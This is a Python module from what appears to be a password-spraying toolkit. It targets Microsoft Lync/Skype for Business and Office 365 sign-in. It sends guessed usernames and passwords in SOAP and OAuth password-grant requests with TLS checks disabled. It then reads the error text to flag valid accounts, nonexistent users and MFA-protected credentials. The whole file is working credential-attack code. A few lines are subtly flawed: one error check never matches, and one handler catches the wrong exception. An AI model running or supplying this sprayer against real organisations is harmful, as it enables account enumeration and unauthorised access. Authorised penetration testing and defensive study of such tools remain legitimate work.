import asyncio
import httpx
import logging
from json import JSONDecodeError
from lxml import etree
from datetime import datetime, timedelta
from sprayingtoolkit.utils.time import simple_utc
from sprayingtoolkit.base import BaseSprayer

log = logging.getLogger("atomizer.modules.lync.sprayer")
log.setLevel(logging.DEBUG)


class LyncSprayer(BaseSprayer):
    def __init__(self, target, auth_url, hosting_location):
        super().__init__()

        self.domain = target
        self.auth_url = auth_url
        self.hosting_location = hosting_location

        self.error_to_reason_map = {
            "Invalid STS request": "Invalid request was received by server",
            "the account must be added": "Username does not exist",
            "The user account does not exist": "Username does not exist",
            "you must use multi-factor": "Credentials valid however, MFA is required",
            "No tenant-identifying information found": "No tenant-identifying information found",
            "FailedAuthentication": "Invalid credentials",
        }

        self.client = httpx.AsyncClient(verify=False, trust_env=True, http2=True)

    async def shutdown(self):
        await self.client.aclose()

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
    async def auth_o365(self, username, password):
        result = {
            "status_code": None,
            "valid": False,
            "reason": "",
            "error": "",
        }

        utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
        utc_time_1 = (
            (datetime.utcnow() + timedelta(days=1))
            .replace(tzinfo=simple_utc())
            .isoformat()
        )

        soap = f"""<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>{username}</wsse:Username>
        <wsse:Password>{password}</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>{utc_time.replace('+00:00', '1Z')}</wsu:Created>
        <wsu:Expires>{utc_time_1.replace('+00:00', '1Z')}</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>"""

        r = await self.client.post(
            "https://login.microsoftonline.com/rst2.srf",
            headers={"Content-Type": "application/soap+xml; charset=utf-8"},
            data=soap
        )
        result["status_code"] = r.status_code

        xml = etree.XML(r.text.encode())
        msg = xml.xpath("//text()")[-1]

        for error, reason in self.error_to_reason_map.items():
            if error.lower() in msg.lower():
                if error == "invalid sts request":
                    log.error(f"Request:\n{soap}\nResponse:\n{r.text}\n")
                result['reason'] = reason
                result['error'] = msg
                break
        else:
            result['valid'] = True
            result['reason'] = 'No known errors found in response'

        return result

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
    async def auth(self, username, password):
        payload = {
            "grant_type":"password",
            "username": username,
            "password": password
        }

        result = {
            "status_code": None,
            "valid": False,
            "reason": "",
            "error": "",
        }

        r = await self.client.post(self.auth_url, data=payload)
        result["status_code"] = r.status_code
        try:
            r.json()["access_token"]
            result["valid"] = True
            result["reason"] = "Access token is present" 
        except IndexError:
            result["reason"] = "Access token isn't present in response"
        except JSONDecodeError:
            result["reason"] = "Response is not JSON"
        except Exception as e:
            result["reason"] = str(e)

        return result
